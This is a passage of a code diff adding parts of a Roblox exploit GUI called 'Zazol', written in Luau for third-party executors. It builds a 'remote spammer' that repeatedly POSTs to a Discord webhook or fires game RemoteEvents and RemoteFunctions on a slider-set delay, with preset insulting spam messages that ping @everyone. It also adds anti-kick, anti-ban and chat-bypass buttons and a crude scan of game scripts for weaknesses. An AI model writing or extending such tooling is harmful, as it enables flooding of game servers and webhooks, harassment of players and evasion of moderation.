+            stopButton.Parent = scrollFrame
+            stopButton.Visible = true
+            table.insert(remoteSpammerElements, stopButton)
+
+            local statusLabel = Instance.new("TextLabel")
+            statusLabel.Name = "SysStatusLabel"
+            statusLabel.Text = "Status: Idle"
+            statusLabel.Size = UDim2.new(1, -10, 0, 30)
+            statusLabel.Position = UDim2.new(0, 5, 0, 175)
+            statusLabel.BackgroundTransparency = 1
+            statusLabel.TextColor3 = Color3.new(1, 1, 1)
+            statusLabel.Font = Enum.Font.SourceSans
+            statusLabel.TextSize = 14
+            statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+            statusLabel.Parent = scrollFrame
+            statusLabel.Visible = true
+            table.insert(remoteSpammerElements, statusLabel)
+
+            local outputFrame = Instance.new("ScrollingFrame")
+            outputFrame.Name = "SysOutputFrame"
+            outputFrame.Size = UDim2.new(1, -10, 0, 100)
+            outputFrame.Position = UDim2.new(0, 5, 0, 210)
+            outputFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+            outputFrame.BorderSizePixel = 0
+            outputFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+            outputFrame.ScrollBarThickness = 5
+            outputFrame.Parent = scrollFrame
+            outputFrame.Visible = true
+            table.insert(remoteSpammerElements, outputFrame)
+
+            local outputText = Instance.new("TextLabel")
+            outputText.Name = "SysOutputText"
+            outputText.Text = "Output:\n"
+            outputText.Size = UDim2.new(1, -10, 0, 0)
+            outputText.Position = UDim2.new(0, 5, 0, 0)
+            outputText.BackgroundTransparency = 1
+            outputText.TextColor3 = Color3.new(1, 1, 1)
+            outputText.Font = Enum.Font.SourceSans
+            outputText.TextSize = 12
+            outputText.TextXAlignment = Enum.TextXAlignment.Left
+            outputText.TextYAlignment = Enum.TextYAlignment.Top
+            outputText.Parent = outputFrame
+
+            local spamExamples = {
+                {Text = "ez fucked, bitch @everyone", ButtonName = "SpamExample1"},
+                {Text = "u suck dick, loser @everyone", ButtonName = "SpamExample2"},
+                {Text = "get rekt, fucker @everyone", ButtonName = "SpamExample3"},
+                {Text = "cry more, shithead @everyone", ButtonName = "SpamExample4"}
+            }
+
+            for i, example in ipairs(spamExamples) do
+                local spamButton = Instance.new("TextButton")
+                spamButton.Name = "Sys" .. example.ButtonName
+                spamButton.Text = example.Text
+                spamButton.Size = UDim2.new(0.5, -10, 0, 30)
+                spamButton.Position = UDim2.new((i - 1) % 2 * 0.5, 5 + ((i - 1) % 2) * 5, 0, 315 + math.floor((i - 1) / 2) * 35)
+                spamButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+                spamButton.TextColor3 = Color3.new(1, 1, 1)
+                spamButton.Font = Enum.Font.SourceSansBold
+                spamButton.TextSize = 14
+                spamButton.BorderSizePixel = 0
+                spamButton.AutoButtonColor = true
+                spamButton.Parent = scrollFrame
+                spamButton.Visible = true
+                table.insert(remoteSpammerElements, spamButton)
+
+                spamButton.MouseButton1Click:Connect(function()
+                    argsInput.Text = example.Text
+                    Zazol.ShowNotification("Spam text loaded: " .. example.Text, true)
+                end)
+            end
+
+            local minDelay = 0.01
+            local maxDelay = 1
+            local currentDelay = 0.5
+            delayLabel.Text = "Delay: " .. currentDelay .. "s"
+
+            local dragging = false
+            sliderKnob.MouseButton1Down:Connect(function()
+                dragging = true
+            end)
+
+            game:GetService("UserInputService").InputEnded:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                    dragging = false
+                end
+            end)
+
+            game:GetService("UserInputService").InputChanged:Connect(function(input)
+                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                    local mouseX = input.Position.X
+                    local sliderX = delaySlider.AbsolutePosition.X
+                    local sliderWidth = delaySlider.AbsoluteSize.X
+                    local relativeX = math.clamp((mouseX - sliderX) / sliderWidth, 0, 1)
+                    sliderKnob.Position = UDim2.new(relativeX, -5, 0, -5)
+                    currentDelay = minDelay + (maxDelay - minDelay) * relativeX
+                    delayLabel.Text = "Delay: " .. string.format("%.2f", currentDelay) .. "s"
+                end
+            end)
+
+            local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+            if not request then
+                request = function(options)
+                    Zazol.ShowNotification("No HTTP request method available, fuck!", false)
+                    return {Success = false}
+                end
+            end
+
+            local function addOutput(message)
+                outputText.Text = outputText.Text .. message .. "\n"
+                local textHeight = outputText.TextBounds.Y
+                outputText.Size = UDim2.new(1, -10, 0, textHeight)
+                outputFrame.CanvasSize = UDim2.new(0, 0, 0, textHeight + 10)
+            end
+
+            startButton.MouseButton1Click:Connect(function()
+                if isSpamming then
+                    Zazol.ShowNotification("Spamming already in progress, asshole.", false)
+                    return
+                end
+
+                local webhookTarget = webhookInput.Text
+                local remoteTarget = remoteInput.Text
+                local argsText = argsInput.Text
+
+                if (not webhookTarget or webhookTarget == "") and (not remoteTarget or remoteTarget == "") then
+                    Zazol.ShowNotification("Error: Enter a valid webhook URL or remote path, dipshit.", false)
+                    return
+                end
+
+                local isWebhook = webhookTarget:match("^https?://")
+                local remote
+                if remoteTarget and remoteTarget ~= "" then
+                    pcall(function()
+                        remote = loadstring("return " .. remoteTarget)()
+                    end)
+                    if not remote or (not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction")) then
+                        Zazol.ShowNotification("Error: Invalid RemoteEvent/Function path, fucker.", false)
+                        return
+                    end
+                end
+
+                local args = {}
+                if argsText and argsText ~= "" then
+                    for arg in argsText:gmatch("[^,]+") do
+                        arg = arg:match("^%s*(.-)%s*$")
+                        local num = tonumber(arg)
+                        if num then
+                            table.insert(args, num)
+                        else
+                            table.insert(args, arg)
+                        end
+                    end
+                end
+
+                isSpamming = true
+                local startTime = tick()
+                local requestCount = 0
+                statusLabel.Text = "Status: Spamming | Time: 0s | Requests: 0"
+
+                spawn(function()
+                    while isSpamming do
+                        if isWebhook and webhookTarget ~= "" then
+                            local success, response = pcall(function()
+                                local message = argsText ~= "" and argsText or "Zazol Spy Webhook Spam"
+                                return request({
+                                    Url = webhookTarget,
+                                    Method = "POST",
+                                    Headers = {
+                                        ["Content-Type"] = "application/json"
+                                    },
+                                    Body = game:GetService("HttpService"):JSONEncode({content = message})
+                                })
+                            end)
+                            requestCount = requestCount + 1
+                            addOutput("Webhook Request #" .. requestCount .. " | Success: " .. (success and "Yes" or "No") .. " | Response: " .. (success and tostring(response.StatusCode) or "Error"))
+                        end
+                        if remote then
+                            local success, response = pcall(function()
+                                if remote:IsA("RemoteEvent") then
+                                    remote:FireServer(unpack(args))
+                                    return "Fired"
+                                elseif remote:IsA("RemoteFunction") then
+                                    return remote:InvokeServer(unpack(args))
+                                end
+                            end)
+                            requestCount = requestCount + 1
+                            addOutput("Remote Request #" .. requestCount .. " | Success: " .. (success and "Yes" or "No") .. " | Response: " .. (success and tostring(response) or "Error"))
+                        end
+                        local elapsed = math.floor(tick() - startTime)
+                        statusLabel.Text = "Status: Spamming | Time: " .. elapsed .. "s | Requests: " .. requestCount
+                        task.wait(currentDelay)
+                    end
+                    statusLabel.Text = "Status: Stopped | Time: " .. math.floor(tick() - startTime) .. "s | Requests: " .. requestCount
+                end)
+
+                local targetName = (isWebhook and webhookTarget ~= "") and "Webhook" or (remote and remote.Name) or "Combined"
+                Zazol.ShowNotification("Started spamming " .. targetName .. " with delay " .. string.format("%.2f", currentDelay) .. "s, fuck yeah!", true)
+            end)
+
+            stopButton.MouseButton1Click:Connect(function()
+                if not isSpamming then
+                    Zazol.ShowNotification("No spamming in progress, dumbass.", false)
+                    return
+                end
+                isSpamming = false
+                Zazol.ShowNotification("Stopped spamming, shit’s done.", true)
+            end)
+        else
+            for _, element in pairs(remoteSpammerElements) do
+                element.Visible = true
+            end
+        end
+
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 320 + math.ceil(4 / 2) * 35)
+    end)
+
+    remoteTab.MouseButton1Click:Connect(function()
+        hideAllTabs()
+        setActiveTab(remoteTab)
+
+        if not remoteEventsScanned then
+            Zazol.FindRemoteEvents()
+            for _, data in pairs(remoteEventsCache) do
+                Zazol.LogEvent(data.remote, "Found in: " .. data.location, data.isSuspicious, data.isDangerous, data.reason, remoteEventsElements)
+            end
+        else
+            for _, element in pairs(remoteEventsElements) do
+                element.Visible = true
+            end
+        end
+
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #remoteEventsElements * 35)
+    end)
+
+    remoteFuncTab.MouseButton1Click:Connect(function()
+        hideAllTabs()
+        setActiveTab(remoteFuncTab)
+
+        if not remoteFunctionsScanned then
+            Zazol.FindRemoteFunctions()
+            for _, data in pairs(remoteFunctionsCache) do
+                Zazol.LogEvent(data.remote, "Found in: " .. data.location, data.isSuspicious, data.isDangerous, data.reason, remoteFunctionsElements)
+            end
+        else
+            for _, element in pairs(remoteFunctionsElements) do
+                element.Visible = true
+            end
+        end
+
+        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #remoteFunctionsElements * 35)
+    end)
+
+    bypassTab.MouseButton1Click:Connect(function()
+        hideAllTabs()
+        setActiveTab(bypassTab)
+
+        if not bypassScanned then
+            local contentScroll = Instance.new("ScrollingFrame")
+            contentScroll.Name = "SysContentScroll"
+            contentScroll.Size = UDim2.new(1, 0, 1, 0)
+            contentScroll.Position = UDim2.new(0, 0, 0, 0)
+            contentScroll.BackgroundTransparency = 1
+            contentScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+            contentScroll.ScrollBarThickness = 5
+            contentScroll.ScrollBarImageColor3 = Color3.new(0.8, 0.8, 0.8)
+            contentScroll.Parent = scrollFrame
+            contentScroll.Visible = true
+            table.insert(bypassElements, contentScroll)
+
+            local yOffset = 0
+
+            local antiKickButton = Instance.new("TextButton")
+            antiKickButton.Name = "SysAntiKickButton"
+            antiKickButton.Text = "Activate Anti-Kick Protection"
+            antiKickButton.Size = UDim2.new(1, -10, 0, 40)
+            antiKickButton.Position = UDim2.new(0, 5, 0, yOffset)
+            antiKickButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            antiKickButton.TextColor3 = Color3.new(1, 1, 1)
+            antiKickButton.Font = Enum.Font.SourceSansBold
+            antiKickButton.TextSize = 18
+            antiKickButton.BorderSizePixel = 0
+            antiKickButton.AutoButtonColor = true
+            antiKickButton.Parent = contentScroll
+            table.insert(bypassElements, antiKickButton)
+            yOffset = yOffset + 45
+
+            local antiBanButton = Instance.new("TextButton")
+            antiBanButton.Name = "SysAntiBanButton"
+            antiBanButton.Text = "Activate Anti-Ban Protection"
+            antiBanButton.Size = UDim2.new(1, -10, 0, 40)
+            antiBanButton.Position = UDim2.new(0, 5, 0, yOffset)
+            antiBanButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            antiBanButton.TextColor3 = Color3.new(1, 1, 1)
+            antiBanButton.Font = Enum.Font.SourceSansBold
+            antiBanButton.TextSize = 18
+            antiBanButton.BorderSizePixel = 0
+            antiBanButton.AutoButtonColor = true
+            antiBanButton.Parent = contentScroll
+            table.insert(bypassElements, antiBanButton)
+            yOffset = yOffset + 45
+
+            local chatBypassButton = Instance.new("TextButton")
+            chatBypassButton.Name = "SysChatBypassButton"
+            chatBypassButton.Text = "Send Bypassed Message"
+            chatBypassButton.Size = UDim2.new(1, -10, 0, 40)
+            chatBypassButton.Position = UDim2.new(0, 5, 0, yOffset)
+            chatBypassButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+            chatBypassButton.TextColor3 = Color3.new(1, 1, 1)
+            chatBypassButton.Font = Enum.Font.SourceSansBold
+            chatBypassButton.TextSize = 18
+            chatBypassButton.BorderSizePixel = 0
+            chatBypassButton.AutoButtonColor = true
+            chatBypassButton.Parent = contentScroll
+            table.insert(bypassElements, chatBypassButton)
+            yOffset = yOffset + 45
+
+            local chatInput = Instance.new("TextBox")
+            chatInput.Name = "SysChatInput"
+            chatInput.PlaceholderText = "e.g., Hello World"
+            chatInput.Text = ""
+            chatInput.Size = UDim2.new(1, -10, 0, 40)
+            chatInput.Position = UDim2.new(0, 5, 0, yOffset)
+            chatInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+            chatInput.TextColor3 = Color3.new(1, 1, 1)
+            chatInput.Font = Enum.Font.SourceSans
+            chatInput.TextSize = 18
+            chatInput.BorderSizePixel = 0
+            chatInput.Parent = contentScroll
+            table.insert(bypassElements, chatInput)
+            yOffset = yOffset + 45
+
+            local marketplaceService = game:GetService("MarketplaceService")
+            local gameInfo = pcall(function()
+                return marketplaceService:GetProductInfo(game.PlaceId)
+            end) and marketplaceService:GetProductInfo(game.PlaceId) or {}
+
+            local gameInfoLabel = Instance.new("TextLabel")
+            gameInfoLabel.Name = "SysGameInfoLabel"
+            gameInfoLabel.Text = "Game Info:\n" ..
+                "Name: " .. (gameInfo.Name or game.Name) .. "\n" ..
+                "Game ID: " .. game.GameId .. "\n" ..
+                "Place ID: " .. game.PlaceId .. "\n" ..
+                "Creator: " .. (game.CreatorId and game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId) or "Unknown") .. "\n" ..
+                "Creator ID: " .. (game.CreatorId or "N/A") .. "\n" ..
+                "Created: " .. (gameInfo.Created and gameInfo.Created or "N/A") .. "\n" ..
+                "Updated: " .. (gameInfo.Updated and gameInfo.Updated or "N/A") .. "\n" ..
+                "Description: " .. (gameInfo.Description or "N/A") .. "\n" ..
+                "Genre: " .. (gameInfo.Genre or "Unknown") .. "\n" ..
+                "Max Players: " .. game:GetService("Players").MaxPlayers .. "\n" ..
+                "Current Players: " .. #game:GetService("Players"):GetPlayers() .. "\n" ..
+                "Visit Count: " .. (gameInfo.Visits and tostring(gameInfo.Visits) or "N/A") .. "\n" ..
+                "Favorite Count: " .. (gameInfo.FavoritedCount and tostring(gameInfo.FavoritedCount) or "N/A") .. "\n" ..
+                "Private Server: " .. (game.PrivateServerId ~= "" and "Yes" or "No")
+            gameInfoLabel.Size = UDim2.new(1, -10, 0, 220)
+            gameInfoLabel.Position = UDim2.new(0, 5, 0, yOffset)
+            gameInfoLabel.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+            gameInfoLabel.TextColor3 = Color3.new(1, 1, 1)
+            gameInfoLabel.Font = Enum.Font.SourceSans
+            gameInfoLabel.TextSize = 16
+            gameInfoLabel.TextXAlignment = Enum.TextXAlignment.Left
+            gameInfoLabel.TextYAlignment = Enum.TextYAlignment.Top
+            gameInfoLabel.Parent = contentScroll
+            table.insert(bypassElements, gameInfoLabel)
+            yOffset = yOffset + 225
+
+            local vulnCount = 35
+            local vulnHeight = vulnCount * 40 + 30
+            local detailsHeight = 120
+            local maxVulnHeight = vulnHeight + (vulnCount * detailsHeight)
+
+            local vulnFrame = Instance.new("Frame")
+            vulnFrame.Name = "SysVulnFrame"
+            vulnFrame.Size = UDim2.new(1, -10, 0, maxVulnHeight)
+            vulnFrame.Position = UDim2.new(0, 5, 0, yOffset)
+            vulnFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+            vulnFrame.BorderSizePixel = 0
+            vulnFrame.Parent = contentScroll
+            table.insert(bypassElements, vulnFrame)
+
+            local vulnTitle = Instance.new("TextLabel")
+            vulnTitle.Name = "SysVulnTitle"
+            vulnTitle.Text = "Vulnerabilities:"
+            vulnTitle.Size = UDim2.new(1, 0, 0, 30)
+            vulnTitle.Position = UDim2.new(0, 0, 0, 0)
+            vulnTitle.BackgroundTransparency = 1
+            vulnTitle.TextColor3 = Color3.new(1, 1, 1)
+            vulnTitle.Font = Enum.Font.SourceSansBold
+            vulnTitle.TextSize = 20
+            vulnTitle.TextXAlignment = Enum.TextXAlignment.Left
+            vulnTitle.Parent = vulnFrame
+
+            local hasDataValidationIssues = false
+            for _, location in pairs({game:GetService("ReplicatedStorage"), game:GetService("ServerScriptService"), game:GetService("ServerStorage"), game:GetService("Workspace")}) do
+                for _, remote in pairs(location:GetDescendants()) do
+                    if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                        local isSuspicious, isDangerous, _ = Zazol.CheckRemote(remote.Name)
+                        if isSuspicious or isDangerous then
+                            hasDataValidationIssues = true
+                            break
+                        end
+                    end
+                end
+            end
+
+            local isFilteringEnabledDisabled = not game:GetService("Workspace").FilteringEnabled
+
+            local hasLoadstringIssues = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "loadstring") then
+                        hasLoadstringIssues = true
+                        break
+                    end
+                end
+            end
+
+            local hasPlayerDataIssues = false
+            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+                if player:FindFirstChild("Data") then
+                    hasPlayerDataIssues = true
+                    break
+                end
+            end
+
+            local hasMaliciousPlugins = false
+            for _, model in pairs(game:GetDescendants()) do
+                if model:IsA("Model") or model:IsA("Plugin") then
+                    local scripts = model:GetDescendants()
+                    for _, script in pairs(scripts) do
+                        if script:IsA("Script") or script:IsA("LocalScript") then
+                            local source = script.Source
+                            if string.find(source, "Instance.new%s*%(%s*\"RemoteEvent\"") or string.find(source, "Instance.new%s*%(%s*\"RemoteFunction\"") then
+                                hasMaliciousPlugins = true
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+
+            local hasUnsecuredHttp = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "http://") and not string.find(source, "https://") then
+                        hasUnsecuredHttp = true
+                        break
+                    end
+                end
+            end
+
+            local hasExposedVariables = false
+            for _, instance in pairs(game:GetDescendants()) do
+                if instance:IsA("StringValue") or instance:IsA("IntValue") or instance:IsA("BoolValue") then
+                    if instance.Name:lower():match("key") or instance.Name:lower():match("password") or instance.Name:lower():match("secret") then
+                        hasExposedVariables = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnprotectedGui = false
+            for _, gui in pairs(game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"):GetDescendants()) do
+                if gui:IsA("TextBox") or gui:IsA("TextButton") then
+                    if gui.Parent:IsA("ScreenGui") and gui.Parent.ResetOnSpawn then
+                        hasUnprotectedGui = true
+                        break
+                    end
+                end
+            end
+
+            local hasWeakEncryption = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "base64") or string.find(source, "md5") then
+                        hasWeakEncryption = true
+                        break
+                    end
+                end
+            end
+
+            local hasServerLagExploit = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "while%s+true%s+do") or string.find(source, "for%s+i%s*=%s*1,%s*math%.huge") then
+                        hasServerLagExploit = true
+                        break
+                    end
+                end
+            end
+
+            local hasObfuscation = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "[^%a%d%s%p]") or string.find(source, "function%s*%(%s*%)%s*return%s*.-%s*end") or #source > 10000 then
+                        hasObfuscation = true
+                        break
+                    end
+                end
+            end
+
+            local hasWebhookLogging = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "https://discord.com/api/webhooks") or string.find(source, "http%.request") or string.find(source, "syn%.request") then
+                        hasWebhookLogging = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnusualRemotes = false
+            for _, remote in pairs(game:GetDescendants()) do
+                if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                    if remote.Name:match("^[^%a%d]") or #remote.Name > 50 then
+                        hasUnusualRemotes = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedPhysics = false
+            for _, part in pairs(game:GetService("Workspace"):GetDescendants()) do
+                if part:IsA("BasePart") and part.Anchored == false and part.Parent:IsA("Model") and part.Parent.Name:match("Client") then
+                    hasClientSidedPhysics = true
+                    break
+                end
+            end
+
+            local hasRemoteFlooding = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "FireServer") and string.find(source, "task%.wait%s*%(%s*0") then
+                        hasRemoteFlooding = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnsecuredDataStores = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "DataStore") and not string.find(source, "pcall") then
+                        hasUnsecuredDataStores = true
+                        break
+                    end
+                end
+            end
+
+            local hasExploitableConnections = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "Connect") and string.find(source, "PlayerAdded") and not string.find(source, "ServerScriptService") then
+                        hasExploitableConnections = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnprotectedAssets = false
+            for _, asset in pairs(game:GetDescendants()) do
+                if asset:IsA("Sound") or asset:IsA("ImageLabel") or asset:IsA("Decal") then
+                    if asset.Parent:IsA("StarterGui") or asset.Parent:IsA("PlayerGui") then
+                        hasUnprotectedAssets = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedValues = false
+            for _, value in pairs(game:GetDescendants()) do
+                if value:IsA("IntValue") or value:IsA("BoolValue") or value:IsA("StringValue") then
+                    if value.Parent:IsA("Player") or value.Parent:IsA("PlayerGui") then
+                        hasClientSidedValues = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnsecuredRemotes = false
+            for _, remote in pairs(game:GetDescendants()) do
+                if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                    if remote.Parent == game:GetService("ReplicatedStorage") and remote.Name:lower():match("admin") then
+                        hasUnsecuredRemotes = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedScripts = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("LocalScript") then
+                    if script.Parent:IsA("StarterPlayerScripts") and script.Source:match("game%.Players%.LocalPlayer") then
+                        hasClientSidedScripts = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnprotectedEvents = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "BindToRenderStep") or string.find(source, "Heartbeat") then
+                        hasUnprotectedEvents = true
+                        break
+                    end
+                end
+            end
+
+            local hasSuspiciousModules = false
+            for _, module in pairs(game:GetDescendants()) do
+                if module:IsA("ModuleScript") then
+                    local source = module.Source
+                    if string.find(source, "require") and string.find(source, "game%.ServerScriptService") then
+                        hasSuspiciousModules = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnsecuredTeleport = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "TeleportService") and not string.find(source, "pcall") then
+                        hasUnsecuredTeleport = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedReplication = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "ReplicatedStorage") and string.find(source, "Clone") then
+                        hasClientSidedReplication = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnsecuredMarketplace = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "MarketplaceService") and not string.find(source, "pcall") then
+                        hasUnsecuredMarketplace = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedDestruction = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "Destroy") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasClientSidedDestruction = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnprotectedSignals = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "GetPropertyChangedSignal") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasUnprotectedSignals = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnsecuredChat = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "SayMessageRequest") and not string.find(source, "ServerScriptService") then
+                        hasUnsecuredChat = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedMovement = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "Humanoid") and string.find(source, "MoveTo") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasClientSidedMovement = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnprotectedCamera = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "Camera") and string.find(source, "CFrame") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasUnprotectedCamera = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedGuiManipulation = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "PlayerGui") and string.find(source, "Enabled") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasClientSidedGuiManipulation = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnsecuredPlayerStats = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("Script") or script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "leaderstats") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasUnsecuredPlayerStats = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedInput = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "UserInputService") and string.find(source, "InputBegan") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasClientSidedInput = true
+                        break
+                    end
+                end
+            end
+
+            local hasUnprotectedWorkspace = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "Workspace") and string.find(source, "Instance.new") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasUnprotectedWorkspace = true
+                        break
+                    end
+                end
+            end
+
+            local hasClientSidedSound = false
+            for _, script in pairs(game:GetDescendants()) do
+                if script:IsA("LocalScript") then
+                    local source = script.Source
+                    if string.find(source, "Sound") and string.find(source, "Play") and string.find(source, "game%.Players%.LocalPlayer") then
+                        hasClientSidedSound = true
+                        break
+                    end
+                end
+            end
+
+            local function addVulnerabilityResult(name, description, isFound, vulnYOffset)
+                local resultFrame = Instance.new("Frame")
+                resultFrame.Name = "SysResultFrame"
+                resultFrame.Size = UDim2.new(1, 0, 0, 40)
+                resultFrame.Position = UDim2.new(0, 0, 0, vulnYOffset)
+                resultFrame.BackgroundTransparency = 1
+                resultFrame.Parent = vulnFrame
+
+                local icon = Instance.new("TextLabel")
+                icon.Name = "SysIcon"
+                icon.Text = isFound and "⚠️" or "❌"
+                icon.Size = UDim2.new(0, 40, 1, 0)
+                icon.Position = UDim2.new(0, 0, 0, 0)
+                icon.BackgroundTransparency = 1
+                icon.TextColor3 = isFound and Color3.new(1, 0.8, 0) or Color3.new(1, 0, 0)
+                icon.Font = Enum.Font.SourceSansBold
+                icon.TextSize = 20
+                icon.Parent = resultFrame
+
+                local resultLabel = Instance.new("TextLabel")
+                resultLabel.Name = "SysResultLabel"
+                resultLabel.Text = name .. (isFound and ": Detected" or ": Not Detected")
+                resultLabel.Size = UDim2.new(0.7, -40, 1, 0)
+                resultLabel.Position = UDim2.new(0, 40, 0, 0)
+                resultLabel.BackgroundTransparency = 1
+                resultLabel.TextColor3 = Color3.new(1, 1, 1)
+                resultLabel.Font = Enum.Font.SourceSans
+                resultLabel.TextSize = 18
+                resultLabel.TextXAlignment = Enum.TextXAlignment.Left
+                resultLabel.Parent = resultFrame
+
+                local detailsButton = Instance.new("TextButton")
+                detailsButton.Name = "SysDetailsButton"
+                detailsButton.Text = "Details"
+                detailsButton.Size = UDim2.new(0.3, 0, 1, 0)
+                detailsButton.Position = UDim2.new(0.7, 0, 0, 0)
+                detailsButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
+                detailsButton.TextColor3 = Color3.new(1, 1, 1)
+                detailsButton.Font = Enum.Font.SourceSansBold
+                detailsButton.TextSize = 18
+                detailsButton.BorderSizePixel = 0
+                detailsButton.AutoButtonColor = true
+                detailsButton.Parent = resultFrame
+
+                local detailsFrame
+                detailsButton.MouseButton1Click:Connect(function()
+                    if detailsFrame then
+                        detailsFrame:Destroy()
+                        detailsFrame = nil
+                        return
+                    end
+
+                    detailsFrame = Instance.new("Frame")
+                    detailsFrame.Name = "SysDetailsFrame"
+                    detailsFrame.Size = UDim2.new(1, -10, 0, 120)
+                    detailsFrame.Position = UDim2.new(0, 5, 0, vulnYOffset + 45)
+                    detailsFrame.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
+                    detailsFrame.BorderSizePixel = 0
+                    detailsFrame.Parent = vulnFrame
+
+                    local detailsText = Instance.new("TextLabel")
+                    detailsText.Name = "SysDetailsText"
+                    detailsText.Text = (isFound and "⚠️ Vulnerability Detected:\n" or "❌ No Vulnerability:\n") .. 
+                        "Name: " .. name .. "\n" ..
+                        "Description: " .. description .. "\n" ..
+                        "Status: " .. (isFound and "Active" or "Inactive")
+                    detailsText.Size = UDim2.new(1, 0, 1, 0)
+                    detailsText.Position = UDim2.new(0, 0, 0, 0)
